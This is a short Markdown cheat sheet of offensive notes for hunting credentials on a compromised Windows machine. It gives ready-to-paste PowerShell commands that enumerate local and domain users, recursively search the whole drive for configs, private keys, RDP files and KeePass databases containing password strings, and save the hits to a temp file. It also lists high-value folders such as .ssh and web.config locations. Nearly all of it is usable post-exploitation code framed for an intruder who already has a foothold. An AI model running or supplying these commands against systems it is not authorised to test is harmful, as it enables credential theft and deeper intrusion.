# Windows Credential Hunting

Source: inspired by [HackerBlueprint](https://www.youtube.com/@HackerBlueprint)

## When to use
After getting a foothold on a Windows machine - search the filesystem
for plaintext credentials before going deeper.

## Step 1 - Find local users
```powershell
Get-LocalUser | Select Name
```

## Step 2 - Find domain users (if domain joined)
```powershell
net user /domain
```

## Step 3 - Full credential scan
Adapt the username list to what you found in step 1 and 2.

```powershell
Get-ChildItem -Path C:\ -Recurse -Force -Include *.config,*.ini,*.xml,*.bak,*.txt,*.ps1,*.log,*.json,*.yml,*.yaml,*.env,*.cs,*.vb,*.vbs,*.bat,*.cmd,*.key,*.pem,*.crt,*.rdp,*.kdbx -File -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notmatch 'C:\\Windows\\|C:\\Program Files\\WindowsApps|C:\\Program Files\\Microsoft|C:\\Program Files \(x86\)\\Microsoft|C:\\ProgramData\\Microsoft\\Windows|C:\\Users\\All Users\\Microsoft|C:\\Users\\Default' } | Select-String -Pattern "pwd=","password=","username=","user=","pass=","Administrator","<user1>","<user2>" -ErrorAction SilentlyContinue | Out-File C:\Windows\Temp\creds_scan.txt
```

## Step 4 - Read results
```powershell
Get-Content C:\Windows\Temp\creds_scan.txt
```

## High value directories
- `C:\Users\<username>\AppData\` - saved creds, app configs
- `C:\Users\<username>\Desktop\` - scripts, notes left by user
- `C:\Users\<username>\.ssh\` - SSH keys
- `C:\inetpub\` - web.config, connection strings
- `C:\ProgramData\<appname>\` - non-Microsoft app data
- `C:\Backup\`, `C:\Temp\`, `C:\Dev\` - devs drop things here
